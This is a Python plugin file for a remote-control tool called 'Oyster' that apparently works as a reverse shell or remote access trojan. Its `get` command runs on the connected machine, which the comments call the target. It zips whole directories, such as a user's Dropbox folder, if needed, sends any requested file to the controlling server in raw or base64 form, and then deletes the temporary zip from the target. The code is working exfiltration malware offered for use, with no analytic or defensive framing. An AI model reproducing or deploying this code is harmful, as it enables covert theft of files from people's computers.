import os
from os.path import expanduser, getsize
from base64 import b64encode
import zipfile, zlib
from connection import TerminatingClient, HeaderClient


def zipdir(path, ziph):
    """
    Zip an entire directory.

    :param path:
    :param ziph:
    :return:
    """

    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))


def send_file(filepath, client, b64=False):
    """
    Send the contents of a file to the server.
    If b64 is set to True the entire file will
    be read into memory and encoded as base64
    before being sent to the server.  If it
    is left as the default, False, the file
    will be sent as raw bytes in chunks.

    :param filepath:
    :param client:
    :param b64:
    :return:
    """

    # Open the given filepath.

    # Get the total size of the file in bytes.
    total_bytes = getsize(expanduser(filepath))
    # Send the total bytes over to the server if using a HeaderClient.
    if client.connection_type == HeaderClient:
        client.send_data(str(total_bytes))
    read_size = 1024

    # Open the file and send the data.
    with open(expanduser(filepath), 'rb') as f:
        # Encode to base64 and send the data, then return.
        if b64:
            data = b64encode(f.read())
            if client.connection_type == TerminatingClient:
                client.send_data(data, encode=False, chunks=True, echo=False)
            else:
                client.send_data(data, encode=False, echo=False)
            client.terminate()
            f.close()
            return
        # Read the file in chunks based on the read_size, and
        # send those chunks to the server.
        while True:
            data = f.read(read_size)
            # Send the data over to the server.
            client.send_data(data, encode=False, echo=False)
            # When reading a file by bytes, the `data` returned
            # by `f.read(read_size)` will be less than the `size`
            # specified if the EOF is reached.  Knowing that,
            # we can check the size of the `data` to see if it
            # is less than the `read_size`, and stop reading
            # once we hit the EOF.
            if len(data) < read_size:
                f.close()
                break


class Plugin(object):
    """
    Get v1.0

    The `get` command downloads a file(or zipped folder) from
    the currently connected client.

    Invocation:

        get

    Commands:

        get {remote_filepath} {local_filepath}      -   Get a file from the client's
                                                        {remote_filepath} and store
                                                        it at the specified
                                                        {local_filepath}.

    Example:

        < 127.0.0.1 > /Users/user/Oyster> get "/Users/user name/Dropbox" db.zip
    """

    version = 'v1.0'
    # invocation must be set to the command that invokes the plugin.
    invocation = 'get'
    enabled = True

    # The run method must be set on the Plugin object in order to do anything
    def run(self, client, data):
        """
        The run method is called from within the client.py file when needed.

        The `client` argument is the instance of the `Client` object that called the `run` method.
        The `data` argument will be any additional data that was sent along with the command.  It's
        up to the plugin writer to parse the data.

        :param client:
        :param data:
        :return:
        """

        try:
            filepath = data.strip()
            # Try to send the file.
            if client.connection_type == TerminatingClient:
                send_file(filepath, client, b64=True)
            else:
                send_file(filepath, client)

        # Send the error back to the server if the file is not found.
        except FileNotFoundError as err_msg:
            client.send_data(str(err_msg), chunks=True)

        # Handle cases where the file is a directory
        except IsADirectoryError as err_msg:
            # Zip up the directory.
            zip_file = zipfile.ZipFile(expanduser(filepath) + '.zip', 'w', zipfile.ZIP_DEFLATED)
            zipdir(expanduser(filepath), zip_file)
            zip_file.close()

            # Send the zipped folder over to the server.
            send_file(filepath + '.zip', client)
            # Remove the zipped folder from the target.
            os.remove(expanduser(filepath + '.zip'))

        # Send any other error back to the server as well.
        except Exception as err_msg:
            client.send_data(str(err_msg), chunks=True)

        # Send the termination string to the server to let it know the client is done responding.
        client.terminate()

